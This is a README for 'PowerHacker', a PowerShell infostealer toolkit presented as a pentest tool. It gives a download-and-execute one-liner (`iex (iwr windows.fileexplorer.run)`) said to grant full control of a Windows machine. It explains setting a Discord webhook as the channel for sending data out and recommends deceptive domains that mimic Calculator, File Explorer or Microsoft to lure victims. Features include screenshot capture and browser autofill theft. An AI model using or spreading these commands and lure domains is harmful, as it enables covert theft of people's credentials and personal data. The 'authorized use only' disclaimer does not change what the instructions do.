
# PowerHacker :zap: README

Welcome to PowerHacker, a PowerShell-based toolkit designed for penetration testers and cybersecurity professionals. PowerHacker prefers utilizing valuable Top-Level Domains (TLDs) and the setup of subdomains to facilitate efficient red team operations and security assessments.

- A simple command like `iex (iwr calculator.run)` is enough to give full control over a windows system. 

## :lock: Security Notice

Security and ethical use are paramount. PowerHacker is intended for **authorized penetration testing** and/or **educational purposes only**. Misuse of PowerHacker may result in legal consequences. Ensure you have explicit permission to test target systems with PowerHacker.

## :gear: Setup

To leverage PowerHacker for your assessments:

1. Clone the repository:
    ```
    git clone https://github.com/pentestfunctions/powerhacker.git
    ```

2. Navigate to the PowerHacker directory:
    ```
    cd powerhacker
    ```

3. Update the `$WebhookUrl` in the scripts to point to your Discord webhook for data exfiltration. To get a Discord webhook URL:
    - Create a Discord server or use an existing one.
    - Go to Server Settings > Integrations.
    - Click on "Webhooks" and then "New Webhook".
    - Customize your webhook, copy the URL, and use it in the script.

4. Upload the ps1 file to your github account.

5. Register a domain for best outcome, for example:
   - `fileexplorer.run`
   - You can also then add subdomains such as `windows.fileexplorer.run`
   - Some other good TLD ideas: `software` such as `microsoft.sofware` or `calculator.run`

## :rocket: Usage

PowerHacker simplifies the redirection of subdomains to your raw GitHub page containing the PowerShell code. To execute, use:

```
iex (iwr windows.fileexplorer.run)
```

This command downloads and executes the script, uploading all collected data to the specified Discord webhook.

## :warning: Features

- **TakeScreenshot**: Captures the current screen.
- **Convert-JsonToWav**: Converts JSON data to WAV format.
- **Get-BrowserData-AutoFill**: Extracts autofill information from browsers.
- **Comprehensive System Info**: Collects detailed system information, including OS version, build number, and more.

## :key: Emphasis on Security

- Always ensure you are in compliance with all applicable laws and regulations.
- Use PowerHacker responsibly to enhance security posture, not to undermine it.
- Verify the integrity and confidentiality of the data collected during your assessments.

## :question: Support

For questions, issues, or feature requests, use GitHub Issues within the repository.

## :memo: Contributing

Contributions to PowerHacker are welcome. Please submit pull requests with clear descriptions of changes and enhancements.

## :balance_scale: License

PowerHacker is released under [MIT License](LICENSE). By using PowerHacker, you agree to the terms of the license and acknowledge the tool's intended purpose for legal, authorized cybersecurity assessments only.
